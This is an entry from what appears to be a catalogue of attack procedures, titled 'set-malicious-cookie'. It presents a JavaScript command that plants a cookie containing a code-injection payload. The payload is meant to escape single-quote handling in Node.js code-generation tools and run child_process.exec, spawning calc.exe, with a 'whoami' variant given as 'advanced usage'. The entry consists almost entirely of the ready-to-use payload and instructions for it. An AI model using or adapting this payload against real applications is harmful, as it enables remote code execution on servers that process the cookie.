---
data: document.cookie = "test='/require('child_process').exec('calc.exe')//"
tags:
  - injection
  - cookie
type: command
output: >-
  Cookie set successfully, no visible output but alters the Cookie header in
  subsequent requests
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:53.815Z'
id: 33405cc9-59a0-4e94-ac95-e6a8d0d1d811
verified: false
validated: true
submitted: true
---
# set-malicious-cookie

## Command

```javascript
document.cookie = "test='/require('child_process').exec('calc.exe')//"
```

## Description

This JavaScript command sets a browser cookie with a payload designed to exploit single-quote escaping flaws in Node.js code generation tools, injecting arbitrary code like spawning calc.exe via child_process.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| document.cookie | The cookie string to set, including the payload that escapes with '/' and injects Node.js require/exec | Yes |

## Examples

### Basic Usage

```javascript
document.cookie = "test='/require('child_process').exec('calc.exe')//"
```

### Advanced Usage

```javascript
document.cookie = "session='`; require('child_process').exec('whoami'); //`"; // Adapted for different payloads
```

## Expected Output

No console output; verify with `console.log(document.cookie)` to see the full string including the injection payload. Subsequent HTTP requests will include this in the Cookie header.

## Related

- [[Related Procedure: Inject-Malicious-Cookie-via-DevTools]]
